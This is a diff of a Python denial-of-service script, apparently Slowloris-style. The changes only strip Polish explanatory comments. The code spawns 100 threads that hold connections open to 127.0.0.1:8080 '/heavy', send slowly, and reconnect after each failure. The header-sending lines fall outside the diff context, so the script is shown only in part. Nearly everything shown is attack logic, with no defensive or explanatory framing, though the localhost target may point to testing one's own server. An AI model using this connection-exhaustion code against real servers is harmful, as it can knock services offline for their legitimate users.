@@ -5,13 +5,13 @@ import threading
 target_host = "127.0.0.1"
 target_port = 8080
 path = "/heavy"
-threads_count = 100  # Liczba równoległych połączeń
+threads_count = 100 
 
 def attack():
-    while True: # Pętla, aby wątek odrodził się po zerwaniu połączenia
+    while True: 
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4) # Timeout, żeby wątek nie wisiał na martwym gnieździe
+            s.settimeout(4) 
             s.connect((target_host, target_port))
 
             header = (
@@ -30,7 +30,7 @@ def attack():
                 time.sleep(10)
         except socket.error:
             print(f"[!] [Wątek {threading.current_thread().name}] Połączenie przerwane, restartuję...")
-            time.sleep(1) # Krótka przerwa przed ponowną próbą
+            time.sleep(1)
         finally:
             s.close()
 
@@ -40,10 +40,10 @@ if __name__ == "__main__":
     threads = []
     for i in range(threads_count):
         t = threading.Thread(target=attack, name=f"Worker-{i}")
-        t.daemon = True  # Dzięki temu proces zamknie się po Ctrl+C
+        t.daemon = True 
         threads.append(t)
         t.start()
-        time.sleep(0.1) # Mały delay, żeby nie zasypać stosu TCP naraz
+        time.sleep(0.1) 
 
     # Trzymamy główny wątek przy życiu
     try:
